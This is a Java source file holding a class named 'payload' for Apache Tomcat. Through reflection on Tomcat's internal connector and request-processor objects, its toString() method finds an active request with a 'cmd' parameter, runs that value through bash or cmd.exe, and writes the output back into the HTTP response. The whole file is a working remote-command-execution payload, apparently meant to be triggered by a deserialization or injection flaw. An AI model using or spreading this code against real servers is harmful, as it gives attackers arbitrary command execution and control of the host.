package org.example.toolong;

import org.apache.catalina.Context;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Scanner;

public class payload {
	@Override
	public String toString() {
		String cmd = null;
		try {
			WebappClassLoaderBase loader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
			Context context = loader.getResources().getContext();
			// ApplicationContext
			Field applicationContextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
			applicationContextField.setAccessible(true);
			ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(context);
			// StandardService
			Field serviceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
			serviceField.setAccessible(true);
			StandardService standardService = (StandardService) serviceField.get(applicationContext);

			// HTTP Connector
			Connector[] connectors = standardService.findConnectors();
			for (Connector connector : connectors) {
				if (connector.getScheme().contains("http")) {
					// AbstractProtocol
					AbstractProtocol abstractProtocol = (AbstractProtocol) connector.getProtocolHandler();

					// AbstractProtocol$ConnectionHandler
					Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
					getHandler.setAccessible(true);
					AbstractEndpoint.Handler ConnectionHandler = (AbstractEndpoint.Handler) getHandler.invoke(abstractProtocol);

					// global(RequestGroupInfo)
					Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
					globalField.setAccessible(true);
					RequestGroupInfo global = (RequestGroupInfo) globalField.get(ConnectionHandler);

					// processors (ArrayList)
					Field processorsField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
					processorsField.setAccessible(true);
					ArrayList processors = (ArrayList) processorsField.get(global);

					for (Object processor : processors) {
						RequestInfo requestInfo = (RequestInfo) processor;
						// RequestInfo
						if (requestInfo.getCurrentQueryString().contains("cmd")) {
							// req
							Field reqField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
							reqField.setAccessible(true);
							Request requestTemp = (Request) reqField.get(requestInfo);
							org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requestTemp.getNote(1);

							cmd = request.getParameter("cmd");
							String[] cmds = null;
							if (cmd != null) {
								if (System.getProperty("os.name").toLowerCase().contains("win")) {
									cmds = new String[]{"cmd", "/c", cmd};
								} else {
									cmds = new String[]{"/bin/bash", "-c", cmd};
								}
								InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
								Scanner s = new Scanner(inputStream).useDelimiter("//A");
								String output = s.hasNext() ? s.next() : "";
								PrintWriter writer = request.getResponse().getWriter();
								writer.write(output);
								writer.flush();
								writer.close();

								break;
							}
						}
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
}
